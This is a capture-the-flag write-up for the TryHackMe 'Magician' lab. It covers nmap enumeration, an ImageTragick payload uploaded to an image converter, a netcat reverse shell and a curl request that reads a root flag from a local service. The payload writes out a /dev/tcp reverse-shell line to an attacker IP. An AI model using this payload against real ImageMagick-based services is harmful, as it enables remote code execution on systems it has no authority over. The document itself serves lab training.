Let’s take a look at the [Magician CTF](https://tryhackme.com/room/magician) on TryHackMe.
Let’s first add the hostname to our `/etc/hosts` file, as told in the room:

```
echo "10.10.244.57 magician" | sudo tee -a /etc/hosts
```

## Enumeration
### Nmap Scan
The first step of my enumeration was a nmap scan. by the command:

```
nmap -sC -sV -T4 -p- -oN nmapscan magician
```

```
PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl 63 vsftpd 2.0.8 or later
8080/tcp open  http-proxy syn-ack ttl 63

```
The “Nmap Output” displayed `3` services running under ports 21, 8080 and 8081.

## Exploring 
Navigating to the services:

- we got first a **FTP service** and I tried to connect to it as anonymous:

![FTP](/images/Magician/ftp.jpg)

- Browsing to http://magician:8080 we got a whitelabel error page and indicates that there's no explicit mapping for /error

- Browsing to http://magician:8081 we got a web application that let us convert image file formats and with the hint that we got from FTP:

```
The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
```

## Exploiting
After some research I've got a [github repo](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik#exploit-v1) that let me  exploit the web app:

```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/10.8.174.180/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
```
![Payload](/images/Magician/payload.jpg)

Then I opened a netcat listener and upload the image:

```
nc -nlvp 4444
```

## User Flag
In our listener window, a reverse shell appears and I tried to upgrade NC shell with [Python](https://zsecure.uk/guides/upgrade-nc-shell-with-python-3/):

```
python -c 'import pty; pty.spawn("/bin/bash")'
```
And I got the flag :

```
THM{******************}
```

## Root Flag
For the root flag I was thinking a privilege escalation but the hint led to another path:

```
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```
So I checked the network connections with netstat command:

```
netstat -anp
```

![Netstat](/images/Magician/netstats.jpg)

So first I tried to access the source code of the web app in the port **6666** with curl command. Then I got a form and an input with the name and the id of `filename` so I tested the root flag file:

```
curl -X POST http://127.0.0.1:6666 -d "filename=/root/root.txt"
```

And I got a encoded data its seems like **ROT13** algorithm:

```
echo "GUZ{******************}" | tr '[A-Za-z]' '[N-ZA-Mn-za-m]'
```

```
